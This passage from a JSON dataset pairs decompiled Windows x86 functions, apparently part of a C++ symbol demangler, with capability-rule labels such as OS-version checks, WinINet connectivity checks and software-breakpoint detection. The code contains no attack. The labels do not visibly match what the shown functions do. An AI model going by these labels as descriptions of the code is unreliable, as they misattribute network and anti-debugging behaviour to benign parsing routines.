        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00437145(uint arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint32_t uVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_ch;\n    \n    arg_ch = 0x28;\n    fcn.00476b23();\n    *0x6ccc34 = *0x6ccc34 + 1;\n    *(unaff_EBP + -4) = 0;\n    if ((*0x6ccc24 & 0x2000) == 0) {\n        if (**0x6ccc1c != '?') {\n            if (**0x6ccc1c == '\\0') {\n                var_4h = 1;\n            }\n            else {\ncode_r0x00437338:\n                var_4h = 2;\n            }\n            fcn.00434635(var_4h);\n            goto code_r0x0043738d;\n        }\n        pcVar1 = *0x6ccc1c + 1;\n        if ((*pcVar1 != '?') || ((*0x6ccc1c)[2] != '?')) {\n            *0x6ccc1c = pcVar1;\n            fcn.00439876(unaff_EBP + -0x18);\n            iVar5 = *(unaff_EBP + -0x18);\n            uVar7 = *(unaff_EBP + -0x14);\n            if ((iVar5 == 0) || ((uVar7 & 0x200) == 0)) {\n                *(unaff_EBP + -0x10) = 0;\n            }\n            else {\n                *(unaff_EBP + -0x10) = 1;\n            }\n            uVar8 = uVar7 >> 0xf;\n            if (uVar7 < '\\x02') {\n                if ((**0x6ccc1c != '\\0') && (**0x6ccc1c != '@')) {\n                    fcn.004390fb(unaff_EBP + -0x28);\n                    if (*(unaff_EBP + -0x28) != 0) {\n                        if (*0x6ccc28 == '\\0') {\n                            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x28);\n                            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x24);\n                            *(unaff_EBP + -0x30) = 0x47da2c;\n                            *(unaff_EBP + -0x2c) = 2;\n                            fcn.00434aab(unaff_EBP + -0x30);\n                            iVar5 = unaff_EBP + -0x28;\n                        }\n                        else {\n                            *0x6ccc28 = '\\0';\n                            *(unaff_EBP + -0x20) = iVar5;\n                            *(unaff_EBP + -0x1c) = uVar7;\n                            fcn.00434b03(unaff_EBP + -0x28);\n                            pcVar1 = *0x6ccc1c;\n                            iVar5 = *(unaff_EBP + -0x20);\n                            uVar7 = *(unaff_EBP + -0x1c);\n                            *(unaff_EBP + -0x18) = iVar5;\n                            cVar2 = *pcVar1;\n                            *(unaff_EBP + -0x14) = uVar7;\n                            if (cVar2 == '@') goto code_r0x004372f2;\n                            puVar4 = fcn.004390fb(unaff_EBP + -0x30);\n                            *(unaff_EBP + -0x28) = 0x47da2c;\n                            *(unaff_EBP + -0x24) = 2;\n                            uVar3 = *puVar4;\n                            *(unaff_EBP + -0x1c) = puVar4[1];\n                            *(unaff_EBP + -0x20) = uVar3;\n                            fcn.00434aab(unaff_EBP + -0x28);\n                            iVar5 = unaff_EBP + -0x30;\n                        }\n                        piVar6 = fcn.00434a09(iVar5, arg_ch);\n                        uVar7 = piVar6[1];\n                        iVar5 = *piVar6;\n                        *(unaff_EBP + -0x14) = uVar7;\n                        *(unaff_EBP + -0x18) = iVar5;\n                    }\n                }\ncode_r0x004372f2:\n                if ((*(unaff_EBP + -0x10) != 0) && (iVar5 != 0)) {\n                    uVar7 = uVar7 | 0x200;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((uVar8 & 1) != 0) {\n                    uVar7 = uVar7 | 0x8000;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((iVar5 != 0) && ((uVar7 & 0x1000) == 0)) {\n                    if (**0x6ccc1c != '\\0') {\n                        if (**0x6ccc1c != '@') goto code_r0x00437338;\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                    if ((((*0x6ccc24 & 0x1000) == 0) || (*(unaff_EBP + -0x10) != 0)) || ((uVar7 & 0x8000) != 0)) {\n                        fcn.00434d42(*(unaff_EBP + 8), unaff_EBP + -0x18);\n                        goto code_r0x0043738d;\n                    }\n                    *(unaff_EBP + -0x30) = 0;\n                    *(unaff_EBP + -0x2c) = 0;\n                    fcn.00434d42(unaff_EBP + -0x28, unaff_EBP + -0x30);\n                }\n            }\n            piVar6 = *(unaff_EBP + 8);\n            *piVar6 = iVar5;\n            piVar6[1] = uVar7;\n            goto code_r0x0043738d;\n        }\n        *0x6ccc1c = pcVar1;\n        fcn.00437145(unaff_EBP + -0x28);\n        for (; **0x6ccc1c != '\\0'; *0x6ccc1c = *0x6ccc1c + 1) {\n        }\n    }\n    else {\n        *0x6ccc24 = *0x6ccc24 & 0xffffdfff;\n        fcn.0043706e(unaff_EBP + -0x28, 0);\n        *0x6ccc24 = *0x6ccc24 | 0x2000;\n    }\n    puVar4 = *(unaff_EBP + 8);\n    *puVar4 = *(unaff_EBP + -0x28);\n    puVar4[1] = *(unaff_EBP + -0x24);\ncode_r0x0043738d:\n    *0x6ccc34 = *0x6ccc34 + -1;\n    fcn.00476af1();\n    return;\n}\n",
        "token_count": 1735
    },
    "00437399": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.00437399(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar5 = **0x6ccc1c != 'Q';\n    if (!bVar5) {\n        *0x6ccc1c = *0x6ccc1c + 1;\n    }\n    cVar1 = **0x6ccc1c;\n    if (cVar1 == '\\0') {\n        fcn.00434635(1);\n        return arg_8h;\n    }\n    if ((cVar1 < '0') || ('9' < cVar1)) {\n        fcn.0043a653(&var_28h);\n        if (var_20h == '\\0') {\n            if (**0x6ccc1c != '\\0') {\n                uVar2 = 0;\n                var_4h = 2;\n                var_8h = 0;\n                puVar3 = &var_8h;\n                goto code_r0x00437498;\n            }\n            puVar3 = fcn.00434635(1);\n        }\n        else {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            if (arg_ch == '\\0') {\n                if (bVar5) goto code_r0x00437420;\n                goto code_r0x004373ed;\n            }\n            if (!bVar5) {\n                uVar2 = fcn.0043467f(var_28h, var_24h);\n                goto code_r0x004373f2;\n            }\n            puVar3 = fcn.0043467f(var_28h, var_24h);\n        }\n    }\n    else {\n        *0x6ccc1c = *0x6ccc1c + 1;\n        uVar4 = cVar1;\n        if (bVar5) {\n            var_28h = uVar4 - 0x2f;\n            var_24h = (uVar4 >> 0x1f) + -1 + (0x2e < uVar4);\ncode_r0x00437420:\n            puVar3 = fcn.00434712(var_28h, var_24h);\n        }\n        else {\n            var_28h = uVar4 - 0x2f;\n            var_24h = var_28h >> 0x1f;\ncode_r0x004373ed:\n            uVar2 = fcn.00434712(var_28h, var_24h);\ncode_r0x004373f2:\n            fcn.00434593(0x6cae10);\n            fcn.00434a09(&var_8h, uVar2);\n            puVar3 = &var_8h;\n        }\n    }\n    uVar2 = *puVar3;\ncode_r0x00437498:\n    *arg_8h = uVar2;\n    arg_8h[1] = puVar3[1];\n    return arg_8h;\n}\n",
        "token_count": 755
    },
    "004374a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004374a7(uint *arg_8h)\n\n{\n    char *pcVar1;\n    \n    if ((((**0x6ccc1c != '\\0') && (**0x6ccc1c == '_')) && ((*0x6ccc1c)[1] != '\\0')) && ((*0x6ccc1c)[1] == '_')) {\n        pcVar1 = *0x6ccc1c + 2;\n        *0x6ccc1c = *0x6ccc1c + 3;\n        if (3 < *pcVar1 - 0x41U) {\n            fcn.00434635(2);\n            return arg_8h;\n        }\n    }\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    return arg_8h;\n}\n",
        "token_count": 187
    },
    "004377c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004377c5(int32_t *arg_8h, int32_t *arg_ch, uchar *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar4 = *0x6ccc1c + 1;\n    var_10h = 0;\n    iVar5 = *pcVar4;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    if (iVar5 == 0x41) {\n        *0x6ccc1c = pcVar4;\n        if (arg_14h == 0) {\n            if ((*arg_ch == 2) || (*arg_ch == 3)) {\n                *arg_ch = 5;\n            }\n            else if (*arg_ch == 1) {\n                *arg_ch = 4;\n            }\n        }\ncode_r0x0043795e:\n        *0x6ccc1c = *0x6ccc1c + 1;\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n    }\n    else {\n        if (iVar5 == 0x42) {\n            if (arg_14h == 0) {\n                *0x6ccc1c = pcVar4;\n                *arg_10h = 1;\n                fcn.00435abf(0x3e);\n                goto code_r0x0043795e;\n            }\ncode_r0x00437909:\n            uVar2 = 2;\n        }\n        else {\n            if (iVar5 == 0x43) {\n                *0x6ccc1c = pcVar4;\n                *arg_ch = 5;\n                goto code_r0x0043795e;\n            }\n            if ((*pcVar4 != '\\0') && (pcVar1 = *0x6ccc1c + 2,  *pcVar1 != '\\0')) {\n                if (arg_14h == 0) {\n                    *0x6ccc1c = *0x6ccc1c + 3;\n                    arg_8h_00 = *pcVar1 + -0x30 + (iVar5 + -0x30) * 0x10;\n                    if (1 < arg_8h_00) {\n                        fcn.00435abf(0x2c);\n                        uVar2 = fcn.00434712(arg_8h_00, 0);\n                        piVar3 = fcn.00434a09(&var_18h, uVar2);\n                        var_10h = *piVar3;\n                        var_ch = piVar3[1];\n                    }\n                    fcn.00434b5a(0x3e);\n                    var_8h = var_10h;\n                    var_4h = var_ch;\n                    if (**0x6ccc1c == '$') {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                    else {\n                        fcn.00434b5a(0x5e);\n                    }\n                    var_8h = var_10h;\n                    if (**0x6ccc1c == '\\0') {\n                        if (var_ch < '\\x02') {\n                            var_4h = var_ch;\n                            if (var_10h == 0) {\n                                fcn.00434903(1);\n                                var_ch = var_4h;\n                            }\n                            else {\n                                fcn.004341df(0x47dfec);\n                                var_ch = var_4h;\n                            }\n                        }\n                    }\n                    else {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                    *arg_8h = var_8h;\n                    arg_8h[1] = var_ch | 0x4000;\n                    return arg_8h;\n                }\n                goto code_r0x00437909;\n            }\n            uVar2 = 1;\n        }\n        *0x6ccc1c = pcVar4;\n        fcn.00434635(uVar2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 994
    },
    "004379d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004379d5(uint *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = **0x6ccc1c;\n    if (cVar1 == '\\0') {\n        fcn.00434635(1);\n    }\n    else if ((cVar1 < '0') || ('9' < cVar1)) {\n        fcn.0043a653(&var_10h);\n        if (var_8h == '\\0') {\ncode_r0x00437a62:\n            if (**0x6ccc1c == '\\0') {\n                puVar2 = fcn.00434635(1);\n                uVar3 = *puVar2;\n            }\n            else {\n                uVar3 = 0;\n                var_4h = 2;\n                puVar2 = &var_8h;\n            }\n            *arg_8h = uVar3;\n            arg_8h[1] = puVar2[1];\n            return arg_8h;\n        }\n        *0x6ccc1c = *0x6ccc1c + 1;\n        if (arg_ch == 0x42) {\n            fcn.00434498(arg_8h);\n        }\n        else {\n            if (arg_ch != 0x41) goto code_r0x00437a62;\n            fcn.00434438(arg_8h);\n        }\n    }\n    else {\n        *0x6ccc1c = *0x6ccc1c + 1;\n        fcn.00434712(cVar1 + -0x2f, cVar1 + -0x2f >> 0x1f);\n    }\n    return arg_8h;\n}\n",
        "token_count": 434
    },
    "00437f07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00437f07(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_stack_ffffffe0;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        fcn.00439bce(&var_8h);\n        fcn.00434b5a(0x2e);\n        arg_8h_00 = fcn.0043a99f(&var_10h, 0, 0);\n        fcn.00434b03(arg_8h_00);\n        if (**0x6ccc1c == '@') {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        in_stack_ffffffe0 = 2;\n    }\n    fcn.00434635(in_stack_ffffffe0);\n    return arg_8h;\n}\n",
        "token_count": 249
    },
    "004380b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t ** __cdecl fcn.004380b7(int32_t **arg_8h, uint arg_ch, uchar *arg_10h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    int32_t **ppiVar3;\n    code **ppcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint8_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint8_t *puVar13;\n    code **ppcVar14;\n    uint uVar15;\n    uint var_28h;\n    char *var_20h;\n    int32_t *var_1ch;\n    code **var_18h;\n    int32_t *var_14h;\n    code **var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    code **var_4h;\n    \n    iVar9 = **0x6ccc1c;\n    puVar13 = *0x6ccc1c + 1;\n    ppcVar14 = NULL;\n    var_10h = NULL;\n    var_ch = NULL;\n    var_18h = NULL;\n    var_14h = NULL;\n    puVar10 = puVar13;\n    // switch table (22 cases) at 0x438957\n    switch(iVar9) {\n    case 0x5b:\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n        goto code_r0x0043812a;\n    case 0x5f:\n        iVar9 = *puVar13;\n        puVar1 = *0x6ccc1c + 2;\n        puVar10 = puVar1;\n    // switch table (24 cases) at 0x43897b\n        switch(iVar9) {\n        case 0x50:\n            *0x6ccc1c = puVar1;\n            fcn.0043486d(*puVar13 * 8 + 0x47d050);\n            ppiVar3 = fcn.004380b7(&var_20h, 0, NULL);\n            var_18h = *ppiVar3;\n            var_14h = ppiVar3[1];\n            puVar13 = *0x6ccc1c;\n            if ((var_18h == NULL) || (puVar10 = *0x6ccc1c,  (var_14h & 0x400) == 0)) goto code_r0x004384e0;\n            break;\n        case 0x51:\n            goto code_r0x004382b1;\n        case 0x52:\n            *0x6ccc1c = puVar1;\n            fcn.0043486d(*puVar13 * 8 + 0x47d050);\n            if (**0x6ccc1c == 0) {\n                fcn.00434a6f(arg_8h, 1);\n                return arg_8h;\n            }\n            uVar5 = **0x6ccc1c - 0x30;\n            puVar10 = *0x6ccc1c;\n            if ((uVar5 < 0) || (4 < uVar5)) break;\n            fcn.0043486d(uVar5 * 8 + 0x47d390);\n            piVar11 = var_ch;\n            ppcVar14 = var_10h;\n            uVar8 = **0x6ccc1c;\n            puVar13 = *0x6ccc1c + 1;\n            if (uVar8 == 0x30) {\n                *0x6ccc1c = puVar13;\n                fcn.0043706e(&var_20h, 0);\n                var_8h = var_20h;\n                var_4h = var_1ch;\n                fcn.00434b5a(0x20);\n                fcn.00434a09(&var_28h, &var_10h);\n                puVar13 = *0x6ccc1c;\ncode_r0x004384e0:\n                *0x6ccc1c = puVar13;\n                fcn.00434a09(arg_8h, &var_18h);\n                return arg_8h;\n            }\n            if (uVar8 == 0x31) {\n                var_8h = var_10h;\n                var_4h = var_ch;\n                *0x6ccc1c = puVar13;\n                if (var_ch < '\\x02') {\n                    if (var_10h == NULL) {\n                        if (var_18h == NULL) {\ncode_r0x004385f6:\n                            fcn.00434903(var_14h);\n                        }\n                        else {\n                            var_8h = var_18h;\n                            var_4h = var_14h;\n                        }\n                    }\n                    else if (var_18h == NULL) {\n                        iVar9 = var_14h;\n                        if ((iVar9 != 0) && (iVar6 = fcn.0043ac37(),  iVar6 != 0)) {\n                            iVar6 = fcn.0043abdc();\n                            if ((iVar6 != 0) || ((iVar9 == 2 || (iVar9 == 3)))) goto code_r0x004385f6;\n                            uVar15 = fcn.0043acc3(iVar9);\n                            fcn.004341df(uVar15);\n                        }\n                    }\n                    else {\n                        iVar9 = fcn.0043484e(0x10, 0x6ccc38, 0);\n                        if (iVar9 == 0) {\n                            var_8h = NULL;\n                        }\n                        else {\n                            var_8h = fcn.00434828(ppcVar14, var_18h);\n                        }\n                        if (var_8h == NULL) {\n                            var_4h = piVar11 & 0xffffff03 | 3;\n                        }\n                    }\n                }\n                fcn.004395ac(&var_20h);\n                uVar15 = fcn.00434a2b(&var_18h, 0x2c);\n                fcn.00434b03(uVar15);\n                fcn.004395ac(&var_20h);\n                ppiVar3 = fcn.00434a2b(&var_18h, 0x2c);\n                if (var_4h < '\\x02') {\n                    ppcVar14 = *ppiVar3;\n                    if (var_8h == NULL) {\n                        if (ppcVar14 == NULL) {\n                            iVar9 = *(ppiVar3 + 1);\ncode_r0x00438682:\n                            fcn.00434903(iVar9);\n                        }\n                        else {\n                            var_4h = ppiVar3[1];\n                            var_8h = ppcVar14;\n                        }\n                    }\n                    else if (ppcVar14 == NULL) {\n                        iVar9 = *(ppiVar3 + 1);\n                        if (iVar9 != 0) {\n                            if ((iVar9 == 2) || (iVar9 == 3)) goto code_r0x00438682;\n                            uVar15 = fcn.0043acc3(iVar9);\n                            fcn.004341df(uVar15);\n                        }\n                    }\n                    else {\n                        fcn.0043419e(ppcVar14);\n                    }\n                }\n                fcn.004395ac(&var_20h);\n                ppiVar3 = fcn.00434a2b(&var_18h, 0x2c);\n                if (var_4h < '\\x02') {\n                    ppcVar14 = *ppiVar3;\n                    if (var_8h == NULL) {\n                        if (ppcVar14 == NULL) {\n                            iVar9 = *(ppiVar3 + 1);\ncode_r0x004386f5:\n                            fcn.00434903(iVar9);\n                        }\n                        else {\n                            var_4h = ppiVar3[1];\n                            var_8h = ppcVar14;\n                        }\n                    }\n                    else if (ppcVar14 == NULL) {\n                        iVar9 = *(ppiVar3 + 1);\n                        if (iVar9 != 0) {\n                            if ((iVar9 == 2) || (iVar9 == 3)) goto code_r0x004386f5;\n                            uVar15 = fcn.0043acc3(iVar9);\n                            fcn.004341df(uVar15);\n                        }\n                    }\n                    else {\n                        fcn.0043419e(ppcVar14);\n                    }\n                }\n                fcn.00437399(&var_20h, 0);\n                ppiVar3 = fcn.00434a2b(&var_18h, 0x29);\n                if ('\\x01' < var_4h) goto code_r0x004387b1;\n                ppcVar14 = *ppiVar3;\n                if (var_8h == NULL) {\n                    if (ppcVar14 != NULL) {\n                        var_4h = ppiVar3[1];\n                        var_8h = ppcVar14;\n                        goto code_r0x004387b1;\n                    }\n                    iVar9 = *(ppiVar3 + 1);\n                }\n                else {\n                    if (ppcVar14 != NULL) {\n                        fcn.0043419e(ppcVar14);\n                        goto code_r0x004387b1;\n                    }\n                    iVar9 = *(ppiVar3 + 1);\n                    if (iVar9 == 0) goto code_r0x004387b1;\n                    if ((iVar9 != 2) && (iVar9 != 3)) {\n                        uVar15 = fcn.0043acc3(iVar9);\n                        fcn.004341df(uVar15);\n                        goto code_r0x004387b1;\n                    }\n                }\n                fcn.00434903(iVar9);\ncode_r0x004387b1:\n                fcn.00434a2b(arg_8h, 0x27);\n                return arg_8h;\n            }\n            if (((uVar8 == 0x32) || (uVar8 == 0x33)) || (uVar8 == 0x34)) goto code_r0x004384e0;\ncode_r0x00438280:\n            uVar15 = 1;\n            goto code_r0x0043812c;\n        case 0x55:\n        case 0x56:\n            pcVar7 = *puVar13 * 8 + 0x47d050;\n            *0x6ccc1c = puVar1;\n            goto code_r0x0043880a;\n        case 0x57:\n        case 0x5a:\n        case 0x5b:\n        case 0x5c:\n        case 0x5d:\n        case 0x5e:\n            break;\n        case 0x5f:\n            puVar10 = *0x6ccc1c + 3;\n    // switch table (14 cases) at 0x4389af\n            switch(*puVar1) {\n            case 0x41:\n            case 0x42:\n            case 0x43:\n            case 0x44:\n            case 0x47:\n            case 0x48:\n            case 0x49:\n            case 0x4a:\n            case 0x4c:\n            case 0x4d:\n                iVar9 = *puVar1 * 8 + 0x47d118;\n                *0x6ccc1c = puVar10;\n                goto code_r0x004383cd;\n            case 0x45:\n            case 0x46:\n                *0x6ccc1c = puVar10;\n                fcn.00434593(*puVar1 * 8 + 0x47d118);\n                if (**0x6ccc1c == 0x3f) {\n                    uVar15 = fcn.00437145(&var_28h);\n                    fcn.00434b03(uVar15);\n                    if (**0x6ccc1c == 0x40) {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                }\n                else {\n                    uVar15 = fcn.00439876(&var_28h);\n                    fcn.00434b03(uVar15);\n                }\n                var_20h = 0x47da7c;\n                var_1ch = 0x2;\n                fcn.00434aab(&var_20h);\n                goto code_r0x004381b2;\n            case 0x4b:\n                *0x6ccc1c = puVar10;\n                fcn.00434593(*puVar1 * 8 + 0x47d118);\n                uVar8 = **0x6ccc1c;\n                if (uVar8 != 0) {\n                    var_4h = var_4h & 0xffffff00 | uVar8;\n                    do {\n                        if (uVar8 == 0x40) break;\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                        fcn.00434b5a(var_4h);\n                        uVar8 = **0x6ccc1c;\n                        var_4h = var_4h & 0xffffff00 | uVar8;\n                    } while (uVar8 != 0);\n                }\n                if (uVar8 == 0x40) {\n                    *0x6ccc1c = *0x6ccc1c + 1;\n                }\ncode_r0x004381b2:\n                *arg_8h = var_18h;\n                var_ch = var_14h;\n                goto code_r0x004381bd;\n            case 0x4e:\n                *0x6ccc1c = *0x6ccc1c + 4;\n                puVar10 = *0x6ccc1c;\n                if (*puVar10 == 0x32) {\n                    fcn.0043a6db(arg_8h);\n                    return arg_8h;\n                }\n            }\n            break;\n        default:\n            if (iVar9 != 0x47) {\n                if (iVar9 < 0x39) {\n                    if (iVar9 == 0x38) {\ncode_r0x004383c2:\n                        iVar9 = (*0x6ccc1c)[1] * 8 + 0x47d088;\n                        *0x6ccc1c = puVar1;\n                        goto code_r0x004383cd;\n                    }\n                    if (iVar9 < 0x34) {\n                        if (iVar9 != 0x33) {\n                            if (iVar9 == 0) {\n                                *0x6ccc1c = *0x6ccc1c + 1;\n                                goto code_r0x00438280;\n                            }\n                            if (((iVar9 != 0x30) && (iVar9 != 0x31)) && (iVar9 != 0x32)) break;\n                        }\n                    }\n                    else if (((iVar9 != 0x34) && (iVar9 != 0x35)) && (iVar9 != 0x36)) {\n                        if (iVar9 != 0x37) break;\n                        goto code_r0x004383c2;\n                    }\n                    iVar9 = (*0x6ccc1c)[1] * 8 + 0x47d088;\n                    *0x6ccc1c = puVar1;\n                    goto code_r0x004382a5;\n                }\n                if (iVar9 < 0x44) {\n                    if (iVar9 == 0x43) {\n                        uVar15 = 0;\n                        *0x6ccc1c = puVar1;\n                    }\n                    else {\n                        if (iVar9 == 0x39) {\n                            puVar13 = *0x6ccc1c + 1;\n                            *0x6ccc1c = puVar1;\n                            fcn.00434593(*puVar13 * 8 + 0x47d088);\n                            var_14h = var_14h | 0x8000;\n                            goto code_r0x00438450;\n                        }\n                        if (iVar9 != 0x3f) {\n                            iVar9 = iVar9 + -0x40;\n                            goto code_r0x004383f1;\n                        }\n                        puVar10 = *0x6ccc1c + 3;\n                        *0x6ccc1c = puVar1;\n                        if (*puVar1 == 0) goto code_r0x00438280;\n                        if (*puVar1 != 0x30) break;\n                        uVar15 = 1;\n                        *0x6ccc1c = puVar10;\n                    }\n                    fcn.00439764(&var_18h, uVar15);\n                    var_14h = var_14h | 0x1000;\ncode_r0x00438450:\n                    *arg_8h = var_18h;\n                    arg_8h[1] = var_14h;\n                    return arg_8h;\n                }\n                iVar9 = iVar9 + -0x44;\n                if (iVar9 != 0) {\ncode_r0x004383f1:\n                    if ((iVar9 != 1) && (iVar9 != 2)) break;\n                }\n            }\n        case 0x48:\n        case 0x49:\n        case 0x4a:\n        case 0x4b:\n        case 0x4c:\n        case 0x4d:\n        case 0x4e:\n        case 0x4f:\n        case 0x53:\n        case 0x54:\n        case 0x58:\n        case 0x59:\n            iVar9 = (*0x6ccc1c)[1] * 8 + 0x47d050;\n            *0x6ccc1c = puVar1;\ncode_r0x004383cd:\n            fcn.00434593(iVar9);\n            return arg_8h;\n        }\ncode_r0x0043812a:\n        *0x6ccc1c = puVar10;\n        uVar15 = 2;\ncode_r0x0043812c:\n        fcn.00434635(uVar15);\n        break;\n    default:\n        if (iVar9 != 0x49) {\n            if (iVar9 < 0x39) {\n                if (iVar9 != 0x38) {\n                    if (iVar9 < 0x34) {\n                        if (iVar9 != 0x33) {\n                            if (iVar9 == 0) goto code_r0x00438280;\n                            if ((iVar9 == 0x30) || (iVar9 = iVar9 + -0x31,  iVar9 == 0)) {\n                                var_18h = NULL;\n                                var_14h = NULL;\n                                if (arg_ch == '\\0') {\ncode_r0x004381cc:\n                                    *0x6ccc1c = puVar13;\n                                    ppiVar3 = fcn.0043a99f(&var_20h, 0, 0);\n                                    var_10h = *ppiVar3;\n                                    piVar11 = ppiVar3[1];\n                                    *0x6ccc1c = puVar13;\n                                    var_ch = piVar11;\n                                    var_4h = var_10h;\n                                    if ((var_10h != NULL) && (puVar13[-1] == 0x31)) {\n                                        ppiVar3 = fcn.0043499a(&var_20h, 0x7e, &var_10h);\n                                        var_4h = *ppiVar3;\n                                        piVar11 = ppiVar3[1];\n                                    }\n                                    piVar12 = piVar11;\n                                    ppcVar4 = var_4h;\n                                    if (((var_18h != NULL) && (piVar11 < '\\x02')) &&\n                                       (piVar12 = var_14h,  ppcVar4 = var_18h,  var_4h != NULL)) {\n                                        ppcVar4 = fcn.00437f77(0x10);\n                                        if (ppcVar4 != NULL) {\n                                            fcn.00434784();\n                                            ppcVar4[3] = 0xffffffff;\n                                            ppcVar4[1] = var_4h;\n                                            *ppcVar4 = vtable.pairNode.0;\n                                            ppcVar4[2] = var_18h;\n                                            ppcVar14 = ppcVar4;\n                                        }\n                                        piVar12 = piVar11;\n                                        ppcVar4 = ppcVar14;\n                                        if (ppcVar14 == NULL) {\n                                            piVar12 = piVar11 & 0xffffff03 | 3;\n                                        }\n                                    }\n                                    *arg_8h = ppcVar4;\n                                    arg_8h[1] = piVar12;\n                                    return arg_8h;\n                                }\n                                *0x6ccc1c = puVar13;\n                                uVar15 = fcn.004398be(&var_20h);\n                                uVar15 = fcn.0043499a(&var_8h, 0x3c, uVar15);\n                                fcn.00434b03(uVar15);\n                                if (var_18h != NULL) {\n                                    pcVar7 = *(*var_18h + 8);\n                                    (**0x47b3f8)();\n                                    cVar2 = (*pcVar7)();\n                                    if (cVar2 == '>') {\n                                        fcn.00434b5a(0x20);\n                                    }\n                                }\n                                fcn.00434b5a(0x3e);\n                                if (arg_10h != NULL) {\n                                    *arg_10h = 1;\n                                }\n                                if (**0x6ccc1c != 0) {\n                                    puVar13 = *0x6ccc1c + 1;\n                                    goto code_r0x004381cc;\n                                }\n                                goto code_r0x004381b2;\n                            }\ncode_r0x00438121:\n                            if (iVar9 != 1) goto code_r0x0043812a;\n                        }\n                    }\n                    else if (((iVar9 != 0x34) && (iVar9 != 0x35)) && (iVar9 = iVar9 + -0x36,  iVar9 != 0))\n                    goto code_r0x00438121;\n                }\ncode_r0x0043829a:\n                iVar9 = **0x6ccc1c * 8 + 0x47cf68;\n                *0x6ccc1c = puVar13;\ncode_r0x004382a5:\n                fcn.0043486d(iVar9);\n                puVar1 = *0x6ccc1c;\n                goto code_r0x004382b1;\n            }\n            if (iVar9 < 0x45) {\n                if (iVar9 != 0x44) {\n                    if (iVar9 == 0x39) goto code_r0x0043829a;\n                    if (iVar9 != 0x41) {\n                        iVar9 = iVar9 + -0x42;\n                        if (iVar9 != 0) goto code_r0x00438305;\n                        ppcVar14 = 0x1;\n                    }\n                }\n            }\n            else if (((iVar9 != 0x45) && (iVar9 != 0x46)) && (iVar9 = iVar9 